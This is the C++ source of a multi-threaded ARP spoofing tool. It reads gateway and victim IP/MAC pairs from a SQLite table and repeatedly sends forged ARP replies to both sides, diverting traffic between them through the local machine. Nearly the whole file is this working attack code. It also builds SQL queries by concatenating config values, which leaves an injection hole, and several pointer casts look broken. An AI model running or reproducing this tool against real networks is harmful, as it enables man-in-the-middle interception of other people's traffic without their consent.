#include <iostream>
#include <fstream>

#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>

#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <net/ethernet.h>
#include <netpacket/packet.h>


#include <sqlite3.h>

#include <unistd.h>
#include <getopt.h>
#include <pthread.h>

#include <stdlib.h>
#include <stdio.h>
#include <memory.h>
#include <string.h>
#include <net/if.h>

#include <sys/ioctl.h>
#include <bits/ioctls.h>

#include <stdio.h>
#include <stdlib.h>
#include <vector>

#include "sql.h"
#include "rapidxml/rapidxml.hpp"

//structs
using namespace std;

struct arp_ether {
    ether_header eth;
    ether_arp arp;
};

//globals
u_int8_t local_mac[6];
std::vector<pthread_t *> threads;
pthread_mutex_t mutex;
SqlDatabase *db;

sockaddr_ll saddr;

struct option options[]= {
    {"help",0,'h',0},
    {"database",1,'d',0},
    {"interval",1,'s',0},
    {"interface",1,'i',0},
    {"table",1,'t',0},
    {"config-file",1,'c',0},
    {NULL,0,NULL,0}
};
const char *shortoptions="hd:s:i:t:c:";

const char *database_file;
const char *interface;
const char *table;


int interval=1;

//config parameters
const char *config_file=NULL;
const char *pid_file=NULL;
const char *active_mark="active";

//functions
void pars_config(void);
void resolver_thread(void *args);
void resolve(int soc, sockaddr_ll *addr, std::string ip, char *mac);
void send_arp(int socd, sockaddr_ll *addr, string src_ip, string dst_ip, string src_mac, string dst_mac, unsigned short opcode);

void *arpspoof_thread(void *args[]);

void mactoa(char *ascii,char *mac) {
    sprintf(ascii,"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
}

void atomac(char *ascii,char *mac) {
    sscanf(ascii,"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",&mac[0],&mac[1],&mac[2],&mac[3],&mac[4],&mac[5]);
}

using namespace std;

int main(int argc,char *argv[])
{

    char opt;
    do {
        opt=getopt_long(argc,argv,shortoptions,options,NULL);
        switch(opt) {
        case 'd':
            database_file=optarg;
            break;
        case 't':
            table=optarg;
            break;
        case 'c':
            config_file=optarg;
            break;
        case 's':
            interval=atoi(optarg);
        }
    }while(opt!=EOF);


    if(database_file==NULL) {
        cout<<"No database specified\n";
        exit(0);
    }

    if(table==NULL) {
        cout<<"No Table specified\n";
        exit(0);
    }

    if(config_file!=NULL) {
        //opening it
        fstream cnf;
        cnf.open(config_file,std::ios_base::ate|std::ios_base::binary);
        if(cnf.is_open()!=true) {
            cout<<"The config file is specifyed (\'"<<config_file<<"\') but can't open it.\n";
            exit(0);
        }
        int fsize=cnf.tellg();
        void *config=malloc(fsize);
        cnf.read(config,fsize);

        rapidxml::xml_document <> doc;
        doc.parse <0> ((char *)config);
        rapidxml::xml_node<> *root=doc.first_node("arpspoof");
        rapidxml::xml_node<> *param=root->first_node("pidfile");
        pid_file=param->value();
        param=root->first_node("activemark");
        active_mark=param->value();

        cnf.close();
    }
    //....
    pthread_mutex_init(&mutex,NULL);
    string database,table_name;
    database=database_file;
    table_name=table;

    try {
        db=new SqlDatabase(database,SQLITE_OPEN_READWRITE,NULL);
    }

    catch(string a) {
            cout<<a;
    }

    cout<<"\n*INFO:\n"<<"\tdatabase file: "<<database_file<<"\n\tTable: "<<table<<"\n\n";

    db->Prepare("select table_name,interface from "+table_name+";");
    if(db->Execute()!=SQLITE_OK) {
        cout<<"Can't query the table \'"<<table_name<<"\'\ndoes it exist or is in proper format? (or may be it is empty)\n";
        exit(0);
    }

    cout<<"*Totaling "<<db->GetResult().size()<<" entries\n\n";
    //executing a thread for any of entries
    for(int i=0;i<db->GetResult().size();i++) {
        const char *args[2];
        row tmp=db->GetResult()[i];
        args[0]=tmp[0].c_str();
        args[1]=tmp[1].c_str();
        cout<<"*Creating thread for entry #"<<i+1<<" [interface \'"<<args[1]<<"\' on table \'"<<args[0]<<"\']...";

        pthread_t *thread=malloc(sizeof(pthread_t));
        if(pthread_create(thread,NULL,arpspoof_thread,(void *)args)==0) {
            cout<<"OK\n";
            threads.push_back(thread);
        }
        else
            cout<<"ERROR\n";
    }

    cout<<"*"<<threads.size()<<" threads created successfuly\n\n";

    for(int i=0;i<threads.size();i++) {
        pthread_join(*(threads[i]),NULL);
    }

    return 0;
}

void *arpspoof_thread(void *args[]) {
    string table_name,interface_name;
    sockaddr_ll soaddr;

    table_name=(const char *)args[0];
    interface_name=(const char *)args[1];

    int sd=socket(AF_PACKET,SOCK_RAW,htons(ETH_P_ALL));
    if(sd<0) {
        cout<<"Can't create socket.\n";
        pthread_exit(NULL);
    }

    //....
    ifreq ifr;
    memset((void *)&ifr,0,sizeof(ifreq));
    interface_name.copy((char *)&ifr.ifr_ifrn.ifrn_name,interface_name.size());

    if(ioctl(sd,SIOCGIFHWADDR,&ifr)<0) {
        cout<<"Error in ioctl\n";
        pthread_exit(NULL);
    }

    memcpy((void *)soaddr.sll_addr,(const void *)&ifr.ifr_ifru.ifru_hwaddr.sa_data,6);
    soaddr.sll_family=AF_PACKET;
    soaddr.sll_ifindex=if_nametoindex(interface_name.c_str());
    string local_mac;
    char *l_mac=malloc(20);
    memset(l_mac,'0',20);
    mactoa(l_mac,ifr.ifr_ifru.ifru_hwaddr.sa_data);
    local_mac=l_mac;

    cout<<"*MAC address for interface \'"<<interface_name<<"\' is "<<local_mac<<endl;


    while (true) {
        vector <row> gateways,victims;

        pthread_mutex_lock(&mutex);
        //getting gatways list
        db->Prepare("select active,type,ip,mac from "+table_name+" where (type=\'gateway\' and active=\'"+active_mark+"\');");
        db->Execute();
        gateways=db->GetResult();
        //getting victims list
        db->Prepare("select active,type,ip,mac from "+table_name+" where (type=\'victim\' and active=\'"+active_mark+"\');");
        db->Execute();
        victims=db->GetResult();

        pthread_mutex_unlock(&mutex);

        if(gateways.size()==0) {
            cout<<"No gateway in table \'"<<table_name<<"\'\n";
            pthread_exit(NULL);
        }

        if(victims.size()==0) {
            cout<<"No victim in table \'"<<table_name<<"\'\n";
            pthread_exit(NULL);
        }

        /*cout<<"*Number of victims:"<<victims.size()<<endl;
        cout<<"*Number of gateways:"<<gateways.size()<<endl;*/
        row vic,gw;
        string vip,vmac,gip,gmac;
        for (int i=0;i<victims.size();i++) {
            vic=victims[i];
            if(vic[3]=="")
                continue;
            if(vic[2]=="")
                continue;
            vip=vic[2];
            vmac=vic[3];
            for(int j=0;j<gateways.size();j++) {
                gw=gateways[j];
                if(gw[3]=="")
                    continue;
                if(gw[2]=="")
                    continue;
                gip=gw[2];
                gmac=gw[3];

                //cout<<vip<<" <---> "<<gip<<" gateway #"<<j<<endl;
                send_arp(sd,&soaddr,vip,gip,local_mac,gmac,ARPOP_REPLY);
                send_arp(sd,&soaddr,gip,vip,local_mac,vmac,ARPOP_REPLY);
            }
        }
        sleep(interval);
    }
}

void send_arp(int socd,sockaddr_ll *addr, string src_ip, string dst_ip, string src_mac, string dst_mac, unsigned short opcode) {
    in_addr src,dst;
    u_int8_t smac[6],dmac[6];

    inet_aton(src_ip.c_str(),&src);
    inet_aton(dst_ip.c_str(),&dst);

    atomac(src_mac.c_str(),(const char *)&smac);
    atomac(dst_mac.c_str(),(const char *)&dmac);

    arp_ether packet;

    memcpy(&packet.eth.ether_dhost,&dmac,6);
    memcpy(&packet.eth.ether_shost,&smac,6);
    packet.eth.ether_type=htons(ETH_P_ARP);

    packet.arp.ea_hdr.ar_hln=6;
    packet.arp.ea_hdr.ar_pln=4;
    packet.arp.ea_hdr.ar_hrd=htons(ARPHRD_ETHER);
    packet.arp.ea_hdr.ar_pro=htons(ETH_P_IP);
    packet.arp.ea_hdr.ar_op=htons(opcode);

    memcpy(&packet.arp.arp_sha,&smac,6);
    memcpy(&packet.arp.arp_tha,&dmac,6);

    memcpy(&packet.arp.arp_spa,&src,4);
    memcpy(&packet.arp.arp_tpa,&dst,4);

    sendto(socd,(const void *)&packet,sizeof(packet),0,(const sockaddr *)addr,sizeof(sockaddr_ll));
}
